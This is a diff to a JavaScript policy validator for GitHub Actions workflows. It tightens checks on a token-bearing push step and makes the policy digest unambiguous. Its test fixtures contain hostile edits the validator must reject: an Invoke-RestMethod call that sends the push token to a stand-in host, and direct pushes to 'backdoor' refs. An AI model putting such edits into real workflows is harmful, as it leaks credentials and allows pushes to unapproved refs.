@@ -370,11 +370,26 @@ export function validateBuildPolicy(workflow, source) {
   if (!pushStep.run.includes("ArgumentList.Add('HEAD:refs/heads/main')")) {
     reject('side-effect-policy', 'temporary writer push destination is not HEAD:refs/heads/main');
   }
-  for (const match of pushStep.run.matchAll(/refs\/heads\/([^'":\s]+)/gu)) {
-    if (match[1] !== 'main') reject('side-effect-policy', 'temporary writer references a branch other than main');
+  // Every ref namespace, not only refs/heads: a lease on main does not constrain
+  // a push to refs/tags or anywhere else.
+  for (const match of pushStep.run.matchAll(/refs\/([^'":\s]+)/gu)) {
+    if (match[1] !== 'heads/main') {
+      reject('side-effect-policy', 'temporary writer references a ref outside refs/heads/main');
+    }
   }
   if ((pushStep.run.match(/ArgumentList\.Add\('push'\)/gu) ?? []).length !== 1) {
     reject('side-effect-policy', 'temporary writer does not invoke push exactly once');
+  }
+  // This step is exempt from the general second-push check below because it owns
+  // the one approved push. That exemption must not extend to additional push
+  // forms inside the step itself: a direct "git ... push" here reaches the same
+  // remote with the same authorization header, under no lease and in any ref
+  // namespace. Only the read-only subcommands the step needs may be invoked
+  // directly, so any other form — including "git -c ..." — is rejected by name.
+  for (const match of pushStep.run.matchAll(/(?:^|[;{(=])[ \t]*&?[ \t]*git[ \t]+(--?[A-Za-z][A-Za-z-]*|[a-z][a-z-]*)/gmu)) {
+    if (!['rev-parse', 'remote'].includes(match[1])) {
+      reject('side-effect-policy', `temporary writer invokes an unapproved direct git form: ${match[1]}`);
+    }
   }
 
   for (const { jobId, id, run, step } of allRunSteps(workflow)) {
@@ -416,6 +431,23 @@ export function validateBuildPolicy(workflow, source) {
     "'ls-files', '--others', '--exclude-standard', '-z'",
     'writer no longer uses NUL-delimited untracked paths',
   );
+  // Redirected stdout and stderr must be drained concurrently. Reading either to
+  // completion before the other deadlocks once the child fills the unread pipe,
+  // which hangs the step until the Actions timeout instead of failing.
+  if (!pushStep.run.includes('$objProcess.StandardOutput.ReadToEndAsync()') ||
+      !pushStep.run.includes('$objProcess.StandardError.ReadToEndAsync()')) {
+    reject('side-effect-policy', 'temporary writer no longer drains both push streams concurrently');
+  }
+  for (const [jobLabel, job, stepId] of [
+    ['build.verify', verify, 'generate-and-verify'],
+    ['build.temporary-writer', writer, 'prepare-generated-commit'],
+  ]) {
+    const stepRun = findStep(job, stepId, jobLabel).run;
+    if (!stepRun.includes('$objProcess.StandardOutput.BaseStream.CopyToAsync($objOutput)') ||
+        !stepRun.includes('$objProcess.StandardError.ReadToEndAsync()')) {
+      reject('git-policy', `${jobLabel}.${stepId} no longer drains both Git streams concurrently`);
+    }
+  }
 
   validateActionMultiset(source, [
     ACTIONS.checkout,
@@ -694,6 +726,10 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-BUILD-044', 'push destination retargeted off main', 'build', (source) => replaceOnce(source, "ArgumentList.Add('HEAD:refs/heads/main')", "ArgumentList.Add('HEAD:refs/heads/backdoor')")],
   ['T1-BUILD-045', 'second push invocation added', 'build', (source) => replaceOnce(source, "              [void]$objStartInfo.ArgumentList.Add('push')\n", "              [void]$objStartInfo.ArgumentList.Add('push')\n              [void]$objStartInfo.ArgumentList.Add('push')\n")],
   ['T1-BUILD-046', 'alternate network client in a token-bearing step', 'build', (source) => replaceOnce(source, '          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN', '          Invoke-RestMethod -Uri https://example.invalid -Body $env:STYLE_GUIDE_PUSH_TOKEN\n          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN')],
+  ['T1-BUILD-047', 'tag push added to the writer step', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '1'", '              git -c "http.https://github.com/.extraheader=$strAuthorization" push origin HEAD:refs/tags/backdoor\n              $objStartInfo.Environment[\'GIT_CONFIG_COUNT\'] = \'1\'')],
+  ['T1-BUILD-048', 'direct git push form added to the writer step', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '1'", "              git push origin --tags\n              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '1'")],
+  ['T1-BUILD-049', 'sequential push stream reads restored', 'build', (source) => replaceOnce(source, '              $objOutputTask = $objProcess.StandardOutput.ReadToEndAsync()\n              $objErrorTask = $objProcess.StandardError.ReadToEndAsync()\n              $strStandardOutput = $objOutputTask.GetAwaiter().GetResult()\n              $strStandardError = $objErrorTask.GetAwaiter().GetResult()\n', '              $strStandardOutput = $objProcess.StandardOutput.ReadToEnd()\n              $strStandardError = $objProcess.StandardError.ReadToEnd()\n')],
+  ['T1-BUILD-050', 'sequential Git stream reads restored', 'build', (source) => replaceOnce(source, '                  $objCopyTask = $objProcess.StandardOutput.BaseStream.CopyToAsync($objOutput)\n                  $objErrorTask = $objProcess.StandardError.ReadToEndAsync()\n                  $objCopyTask.GetAwaiter().GetResult()\n                  $strError = $objErrorTask.GetAwaiter().GetResult()\n', '                  $objProcess.StandardOutput.BaseStream.CopyTo($objOutput)\n                  $strError = $objProcess.StandardError.ReadToEnd()\n')],
   ['T1-MARKDOWN-001', 'floating Node major', 'markdown', (source) => replaceOnce(source, "          node-version: '24.18.1'", "          node-version: '24'")],
   ['T1-MARKDOWN-002', 'latest Node', 'markdown', (source) => replaceOnce(source, "          node-version: '24.18.1'", "          node-version: 'latest'")],
   ['T1-MARKDOWN-003', 'setup cache enabled', 'markdown', (source) => replaceOnce(source, '          package-manager-cache: false', '          package-manager-cache: true')],
@@ -823,6 +859,17 @@ function readOrdinaryText(path, label) {
   return decodeStrictText(readFileSync(path), label);
 }
 
+// Concatenating sources into one hash is ambiguous: moving a trailing byte from
+// one file onto the front of the next can leave both files valid and produce an
+// identical combined stream, so the digest would not move even though two
+// committed inputs changed. Framing each contribution with its label and exact
+// byte length makes the boundaries unambiguous.
+function foldPolicyInput(hash, label, source) {
+  const bytes = Buffer.from(source, 'utf8');
+  hash.update(`${label}:${bytes.length}\n`, 'utf8');
+  hash.update(bytes);
+}
+
 export function validateRepositoryPolicy(buildPath, markdownPath) {
   if (basename(buildPath) !== 'build.yml' || basename(markdownPath) !== 'markdownlint.yml') {
     reject('cli', 'arguments must be build.yml then markdownlint.yml');
@@ -865,16 +912,22 @@ export function validateRepositoryPolicy(buildPath, markdownPath) {
     // generator matters most here: its bytes can change substantially while its
     // version marker stays fixed, so omitting it left the digest unmoved by a
     // real change to validated content.
-    policyDigest: createHash('sha256')
-      .update(buildSource)
-      .update(markdownSource)
-      .update(dependabotSource)
-      .update(attributes)
-      .update(generatorSource)
-      .update(packageSource)
-      .update(lockSource)
-      .update(validatorSource)
-      .digest('hex'),
+    policyDigest: (() => {
+      const hash = createHash('sha256');
+      for (const [label, source] of [
+        ['build.yml', buildSource],
+        ['markdownlint.yml', markdownSource],
+        ['dependabot.yml', dependabotSource],
+        ['.gitattributes', attributes],
+        ['generator', generatorSource],
+        ['package.json', packageSource],
+        ['package-lock.json', lockSource],
+        ['validator', validatorSource],
+      ]) {
+        foldPolicyInput(hash, label, source);
+      }
+      return hash.digest('hex');
+    })(),
   });
 }
 
